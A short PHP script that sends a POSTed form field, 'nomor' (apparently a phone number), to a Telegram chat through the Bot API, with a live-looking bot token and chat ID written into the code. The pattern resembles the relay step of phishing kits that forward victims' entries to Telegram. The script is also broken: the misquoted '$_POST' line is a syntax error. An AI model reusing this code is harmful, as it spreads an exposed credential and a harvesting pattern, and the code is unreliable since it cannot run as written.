<?php

require 'vendor/autoload.php';

use Telegram\Bot\Api;

$botApiToken = '6285598536:AAG4BiGzBEI7pU3kv_S57UtNuwHAHulE_-M';
$channelId ='5627477315';
$text = '$_POST['nomor']';

$telegram = new Api($botApiToken);
$telegram->sendMessage([
    'chat_id' => $channelId,
    'text' => $text,
]);
